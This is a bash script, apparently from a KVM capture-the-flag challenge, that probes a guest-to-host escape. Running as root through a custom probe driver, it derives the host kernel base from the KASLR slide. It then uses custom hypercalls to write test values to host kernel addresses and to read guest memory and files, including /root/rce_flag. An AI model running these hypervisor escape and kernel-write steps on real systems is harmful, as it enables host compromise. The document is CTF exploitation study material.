#!/bin/bash
# Diagnostic script for KVM CTF hypercall debugging

echo "================================================================================"
echo " KVM CTF Hypercall Diagnostic Tool"
echo "================================================================================"
echo ""

# Check if running as root
if [ $EUID -ne 0 ]; then
    echo "[!] Must run as root"
    exit 1
fi

# Check device
if [ ! -e "/dev/kvm_probe_dev" ]; then
    echo "[!] Device /dev/kvm_probe_dev not found"
    echo "[*] Try: sudo insmod kvm_probe_drv.ko"
    exit 1
fi

echo "[+] Device found: /dev/kvm_probe_dev"
echo ""

# Get KASLR
echo "[*] Step 1: Detecting KASLR"
echo "----------------------------"
KASLR_OUTPUT=$(kvm_prober getkaslr 2>&1)
echo "$KASLR_OUTPUT"
KASLR_SLIDE=$(echo "$KASLR_OUTPUT" | grep "slide:" | awk '{print $4}')
if [ -n "$KASLR_SLIDE" ]; then
    echo "[+] KASLR slide detected: $KASLR_SLIDE"
    # Calculate host kernel base (0xffffffff81000000 + slide)
    HOST_BASE=$(python3 -c "print(hex(0xffffffff81000000 + int('$KASLR_SLIDE', 16)))")
    echo "[+] Host kernel base: $HOST_BASE"
    
    # Calculate write target
    WRITE_TARGET=$(python3 -c "print(hex(0xffffffff81000000 + int('$KASLR_SLIDE', 16) + 0x1279a8))")
    echo "[+] Write target address: $WRITE_TARGET"
else
    echo "[!] KASLR detection failed, using observed slide"
    KASLR_SLIDE="0x21800000"
    WRITE_TARGET="0xffffffffa3e279a8"
fi
echo ""

# Test basic hypercall
echo "[*] Step 2: Testing Basic Hypercall"
echo "------------------------------------"
echo "[*] Executing hypercall 0 (should return error)..."
kvm_prober hypercall 0 0 0 0 0
echo ""
dmesg | tail -3 | grep "HYPERCALL"
echo ""

# Test hypercall 100 (WRITE)
echo "[*] Step 3: Testing Hypercall 100 (WRITE)"
echo "------------------------------------------"
echo "[*] Target: 0x64279a8 (guest offset)"
echo "[*] Value: 0xdeadbeef41424344"
echo ""
kvm_prober hypercall 100 0x64279a8 0xdeadbeef41424344 0 0
echo ""
echo "[*] dmesg output:"
dmesg | tail -5 | grep "HYPERCALL"
echo ""

# Test hypercall 100 with host address
echo "[*] Step 4: Testing Hypercall 100 with HOST address"
echo "----------------------------------------------------"
if [ -n "$WRITE_TARGET" ]; then
    echo "[*] Target: $WRITE_TARGET (host virtual)"
    echo "[*] Value: 0xdeadbeef41424344"
    echo ""
    kvm_prober hypercall 100 "$WRITE_TARGET" 0xdeadbeef41424344 0 0
    echo ""
    echo "[*] dmesg output:"
    dmesg | tail -5 | grep "HYPERCALL"
fi
echo ""

# Test hypercall 101 (READ) with guest buffer
echo "[*] Step 5: Testing Hypercall 101 (READ) with guest buffer"
echo "-----------------------------------------------------------"
echo "[*] First, allocate shared buffer..."
SHARED_OUTPUT=$(kvm_prober alloc_shared 2>&1)
echo "$SHARED_OUTPUT"
SHARED_GPA=$(echo "$SHARED_OUTPUT" | grep -oP '0x[0-9a-f]+' | head -1)

if [ -n "$SHARED_GPA" ]; then
    echo "[+] Shared buffer GPA: $SHARED_GPA"
    echo ""
    echo "[*] Testing read from guest memory (0x1000000)..."
    kvm_prober hypercall 101 0x1000000 "$SHARED_GPA" 256 0
    echo ""
    echo "[*] Reading shared buffer content:"
    kvm_prober read_shared 64
    echo ""
    echo "[*] dmesg output:"
    dmesg | tail -5 | grep "HYPERCALL"
else
    echo "[!] Failed to allocate shared buffer"
fi
echo ""

# Test GPA write/read (baseline)
echo "[*] Step 6: Testing Baseline GPA Operations"
echo "--------------------------------------------"
echo "[*] Writing to guest GPA 0x1000000..."
kvm_prober writegpa 0x1000000 deadbeefcafebabe
echo ""
echo "[*] Reading back from guest GPA 0x1000000..."
kvm_prober readgpa 0x1000000 8
echo ""

# Test file read (known to work)
echo "[*] Step 7: Testing File Read (RCE)"
echo "------------------------------------"
echo "[*] Reading /etc/hostname (should work)..."
kvm_prober readfile /etc/hostname 0 50
echo ""
echo "[*] Trying /root/rce_flag..."
kvm_prober readfile /root/rce_flag 0 256 2>&1
echo ""

# Check for IVSHMEM
echo "[*] Step 8: Checking for IVSHMEM devices"
echo "-----------------------------------------"
echo "[*] Looking for vendor 1af4 (Red Hat/QEMU)..."
lspci -d 1af4: 2>/dev/null || echo "[!] No IVSHMEM devices found"
echo ""
echo "[*] All virtio devices:"
lspci | grep -i virtio || echo "[!] No virtio devices found"
echo ""

# Summary
echo "================================================================================"
echo " Diagnostic Summary"
echo "================================================================================"
echo ""
echo "What we know from your dmesg:"
echo "  ✓ Hypercall 100 executes and returns rax=0 (success)"
echo "  ✓ GPA operations work (guest memory access)"
echo "  ✓ File read works (/etc/hostname read successfully)"
echo "  ✓ KASLR detected: 0x21800000"
echo ""
echo "Possible issues:"
echo "  ? Hypercall 100 may write to guest memory instead of host"
echo "  ? Hypercall 101 may not copy data back to guest buffer"
echo "  ? Host handlers may not implement full functionality"
echo "  ? Need to verify writes actually reach host memory"
echo ""
echo "Next steps:"
echo "  1. Check dmesg for hypercall execution details"
echo "  2. Try hypercall_write_read wrapper functions"
echo "  3. Verify if writes persist across reads"
echo "  4. Try alternative hypercall numbers (102, 103, etc.)"
echo ""
echo "================================================================================"
echo ""
echo "[*] Full dmesg hypercall log:"
dmesg | grep "HYPERCALL" | tail -20

echo ""
echo "[*] Diagnostic complete. Review output above for insights."
